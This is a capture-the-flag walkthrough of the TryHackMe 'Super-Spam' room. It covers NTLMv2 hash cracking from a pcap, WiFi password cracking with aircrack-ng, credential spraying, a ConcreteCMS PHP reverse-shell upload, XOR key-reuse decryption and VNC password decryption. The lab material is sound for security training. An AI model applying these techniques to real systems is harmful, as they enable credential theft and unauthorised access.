# 80 - Super-Spam (Cracking NTLMv2 hashes & Wifi Password, VNC password cracking and VNC session)

Room Link --> [https://tryhackme.com/room/superspamr](https://tryhackme.com/room/superspamr)

### Enumeration

{% code overflow="wrap" lineNumbers="true" %}
```bash
nmap -Pn -n -vvv -T4 10.10.218.80 -p- 

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
4012/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
4019/tcp open  ftp     vsftpd 3.0.3
5901/tcp open  vnc     VNC (protocol 3.8)
6001/tcp open  X11     (access denied)
```
{% endcode %}

The webpaage is running `ConcreteCMS 8.5.2` .

#### FTP Enum

<figure><img src=".gitbook/assets/image (562).png" alt=""><figcaption></figcaption></figure>

### **Cracking NTLMv2 hashes found in "IDS\_logs" packet captures**

The pcap files for 13th and 16th are regarding HTTP requests to a Chinese domain, which we will ignore for now.

The pcap file for the 14th April 2021 is interesting, since it contains SMBv2 protocol captures that include NTLM authentication attempts. Let's see if we can get some useful data from this.

> Note: Ultimately these credentials turned out to be useless. But it was another learning experience.

Use this resource for NTLMv2 hash cracking --> [https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)

```bash
# steps to crack.
1. Open your .pcap that contains an NTLMv2 hash in Wireshark.
2. Filter by ntlmssp to get the authentication handshake.
In this case, we get three packets. Find the NTLMSSP_AUTH packet. Filter the packet down to the Security Blob layer to get to the juicy good stuff:
3. Copy out the domain name and user name to a text document.

4. Drill down into the NTLM Response section to find NTProofStr and NTLMv2 response. Copy both of these out to the text document as a Hex String.

Notice that NTLMv2Response begins with the ntlmProofStr, so delete the ntlmProofStr from the NTLMv2Response.
5. Enter ntlmssp.ntlmserverchallenge into the search filter. This will highlight the packet where the NTLM Server Challenge is found, generally the packet before the NTLM_Auth packet. Copy this value to the text document as a Hex String.
6. Put the values into the following format and save it as crackme.txt:

username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response

7. Find your favorite password list (RockYou? best_1000_passwords2018.txt?) and open a terminal to use hashcat to run:
hashcat -m 5600 crackme.txt passwordlist.txt
```

#### Cracking Process

```bash
Domain Name: 3B
Username: lgreen
NTProofStr: 73aeb418ae0e8a9ec167c4d0880cfe22
NTLMv2 response: 73aeb418ae0e8a9ec167c4d0880cfe22010100000000000049143c43a261d6012ce41adf31a1363c00000000020004003300420001001e003000310035003600360053002d00570049004e00310036002d004900520004001e0074006800720065006500620065006500730063006f002e0063006f006d0003003e003000310035003600360073002d00770069006e00310036002d00690072002e0074006800720065006500620065006500730063006f002e0063006f006d0005001e0074006800720065006500620065006500730063006f002e0063006f006d000700080049143c43a261d60106000400020000000800300030000000000000000100000000200000fc849ef6b042cb4e368a3cbbd2362b5ccc39324c75df3415b6166d7489ad1d2b0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00360036002e0033003600000000000000000000000000

# deleting the NTProofStr from the NTLMv2 response:
010100000000000049143c43a261d6012ce41adf31a1363c00000000020004003300420001001e003000310035003600360053002d00570049004e00310036002d004900520004001e0074006800720065006500620065006500730063006f002e0063006f006d0003003e003000310035003600360073002d00770069006e00310036002d00690072002e0074006800720065006500620065006500730063006f002e0063006f006d0005001e0074006800720065006500620065006500730063006f002e0063006f006d000700080049143c43a261d60106000400020000000800300030000000000000000100000000200000fc849ef6b042cb4e368a3cbbd2362b5ccc39324c75df3415b6166d7489ad1d2b0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00360036002e0033003600000000000000000000000000

search for "ntlmssp.ntlmserverchallenge" as filter:
NTLM Server Challenge: a2cce5d65c5fc02f

# save to a file and use hashcat to crack.
lgreen::3B:a2cce5d65c5fc02f:73aeb418ae0e8a9ec167c4d0880cfe22:010100000000000049143c43a261d6012ce41adf31a1363c00000000020004003300420001001e003000310035003600360053002d00570049004e00310036002d004900520004001e0074006800720065006500620065006500730063006f002e0063006f006d0003003e003000310035003600360073002d00770069006e00310036002d00690072002e0074006800720065006500620065006500730063006f002e0063006f006d0005001e0074006800720065006500620065006500730063006f002e0063006f006d000700080049143c43a261d60106000400020000000800300030000000000000000100000000200000fc849ef6b042cb4e368a3cbbd2362b5ccc39324c75df3415b6166d7489ad1d2b0a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e00360036002e0033003600000000000000000000000000

# cracked
P@$$w0rd
```

<figure><img src=".gitbook/assets/image (563).png" alt=""><figcaption></figcaption></figure>

* Trying this password for the VNC service at port 5901. Nope not working.
* Let's try the `lgreen : P@$$w0rd` combo for the SSH Service at port 4012. Nope not working.
* Maybe trying at the login portal in Concrete5 CMS will work? Tried. Nope not working. Tried with `admin` and `root` usernames as well.

It was a Deadend but learned How to crack NTLMv2 hashes from captured .pcap files.

Moving on to the `.cap` dir.

### Cracking Wifi passwords from captured .cap file

The `.cap` file after opening it with wireshark it is a wifi packet capture, we can crack the password using aircrack-ng

```bash
aircrack-ng -w /usr/share/wordlist/rockyou.txt SamsNetwork.cap

# cracked
sandiago
```

Going back to the website, there are couple of names we can gather from the website: `/blog` dir.

```bash
Lucy_Loser
Donald_Dump
Adam_Admin
Benjamin_Blogger

# Tried each username with both passwords:
sandiago
P@$$w0rd
```

`Donald_Dump : sandiago` - worked.

<figure><img src=".gitbook/assets/image (556).png" alt=""><figcaption></figcaption></figure>

### Initial Access

Since we have logged in, i googled `ConcreteCMS exploit RCE` and saw this [blog](https://vulners.com/hackerone/H1:768322)

Goto [http://10.10.141.83/concrete5/index.php/dashboard/system](http://10.10.141.83/concrete5/index.php/dashboard/system) , then click `Allowed Files Types` to add php extension to the allowed files type so we can upload php rev shell.

<figure><img src=".gitbook/assets/image (557).png" alt=""><figcaption></figcaption></figure>

Add `php` to the list and save it.

Click the `Files` from the dashboard dropdown menu at the right side. Then upload the rev shell.

<figure><img src=".gitbook/assets/image (559).png" alt=""><figcaption></figcaption></figure>

Setup NC listener and copy the link to the php file in the `URL to File` session, click it and we get rev shell.

### Priv Esc to donalddump

```bash
drwxr-xr-x 2 lucy_loser lucy_loser 4096 May 30  2021 .MessagesBackupToGalactic
www-data@super-spam:/home/lucy_loser/.MessagesBackupToGalactic$ ls -al
total 1720
drwxr-xr-x 2 lucy_loser lucy_loser   4096 May 30  2021 .
drwxr-xr-x 7 lucy_loser lucy_loser   4096 Apr  9  2021 ..
-rw-r--r-- 1 lucy_loser lucy_loser 172320 Apr  8  2021 c1.png
-rw-r--r-- 1 lucy_loser lucy_loser 171897 Apr  8  2021 c10.png
-rw-r--r-- 1 lucy_loser lucy_loser 168665 Apr  8  2021 c2.png
-rw-r--r-- 1 lucy_loser lucy_loser 171897 Apr  8  2021 c3.png
-rw-r--r-- 1 lucy_loser lucy_loser 171462 Apr  8  2021 c4.png
-rw-r--r-- 1 lucy_loser lucy_loser 167772 Apr  8  2021 c5.png
-rw-r--r-- 1 lucy_loser lucy_loser 167772 Apr  8  2021 c6.png
-rw-r--r-- 1 lucy_loser lucy_loser 171462 Apr  8  2021 c7.png
-rw-r--r-- 1 lucy_loser lucy_loser 171734 Apr  8  2021 c8.png
-rw-r--r-- 1 lucy_loser lucy_loser 173994 Apr  8  2021 c9.png
-rw-r--r-- 1 lucy_loser lucy_loser  20987 Apr  8  2021 d.png
-rw-r--r-- 1 lucy_loser lucy_loser    497 May 30  2021 note.txt
-rw-r--r-- 1 lucy_loser lucy_loser   1200 Apr  8  2021 xored.py
```

This folder contains some file.

We can use `wget -r http://ip` to download all the files from the victim box.

{% code overflow="wrap" %}
```
dking@dking ~/Downloads/10.10.141.83:8888$ cat note.txt                                                          
Note to self. General super spam mentioned that I should not make the same mistake again of re-using the same key for the XOR encryption of our messages to Alpha Solaris IV's headquarters, otherwise we could have some serious issues if our encrypted messages are compromised. I must keep reminding myself,do not re-use keys,I have done it 8 times already!.The most important messages we sent to the HQ were the first and eighth message.I hope they arrived safely.They are crucial to our end goal.

```
{% endcode %}

Run the `.py` file with `c2.png and c8.png` .

We got the password:

```
$$L3qwert30kcool
```

SSH into donalddump acct.

### Priv Esc to Root

We see a passwd file here, could be password file for the vnc server. Send it to kali.

Using LinPEAS

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

* run this : `vncviewer -passwd passwd 10.10.28.162:5901`

<figure><img src=".gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we get access to the VNC server.

We could also try to crack the passwd file using [https://github.com/jeroennijhof/vncpwd](https://github.com/jeroennijhof/vncpwd)

```
VNC Password Decrypter

It decrypts the stored vnc password.


COMPILE
Just run make or gcc -o vncpwd vncpwd.c d3des.c

USAGE
vncpwd <vnc password file>
```

{% code overflow="wrap" %}
```bash
dking@dking /opt/vncpwd$ ./vncpwd ~/Downloads/passwd
Password: vncpriv
```
{% endcode %}

* you’ll see a hidden dir `.nothing` that have `r00t.txt` file.  Copy that file to `/tmp/root` and read with your SSH user
* copy the flag:

We can generate a ssh key and then also copy it to /tmp and access it from donalddump ssh session too.



Done!

